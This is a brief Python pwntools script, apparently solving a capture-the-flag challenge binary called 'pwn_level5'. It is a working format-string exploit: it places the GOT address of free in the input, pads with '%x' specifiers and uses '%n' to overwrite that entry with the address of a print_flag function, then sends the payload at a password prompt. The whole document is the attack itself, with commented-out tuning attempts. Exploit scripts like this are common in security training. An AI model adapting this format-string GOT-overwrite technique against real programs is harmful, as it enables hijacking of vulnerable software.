#!/usr/bin/python

from pwn import *
import struct

print_flag = 0x8048850
free_plt = 0x804a018

payload = ""
payload += "P"*3
payload += p32(free_plt)
#payload += struct.pack("I", free_plt)
payload += "%x." * 3
#payload += "%134514768x."
payload += "%134514740x."
payload += "%n."

#payload = "PPPAAAA.%x.%x.%x.%x.%x"

conn = process('./pwn_level5')
#gdb.attach(conn)
print conn.recvuntil('password:')
conn.sendline(payload)
response = conn.recvall()
print response
conn.close()
